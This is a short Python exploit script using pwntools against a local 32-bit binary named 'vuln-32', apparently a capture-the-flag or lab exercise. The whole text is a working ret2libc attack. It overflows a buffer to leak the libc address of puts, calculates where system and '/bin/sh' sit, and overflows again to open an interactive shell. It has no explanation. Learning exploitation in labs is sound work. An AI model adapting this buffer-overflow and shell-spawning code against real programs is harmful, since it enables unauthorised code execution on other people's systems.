from pwn import *
elf = context.binary = ELF("./vuln-32")
p = process()
libc = elf.libc
offset = 32
plt_puts = elf.plt['puts']
main = elf.sym['main']
got_puts = elf.got['puts']
payload1 = b"A" * offset + p32(plt_puts) + p32(main) + p32(got_puts)
p.sendline(payload1)
p.recvuntil(b"Come get me\n")
puts_leak = u32(p.recv(4))
print(puts_leak)
puts_offset = libc.sym['puts']
libc.address = puts_leak - puts_offset
system = libc.sym['system']
bin_sh = next(libc.search(b"/bin/sh"))
payload2 = b"A" * offset + p32(system) + p32(0x0) + p32(bin_sh)
p.sendline(payload2)
p.interactive()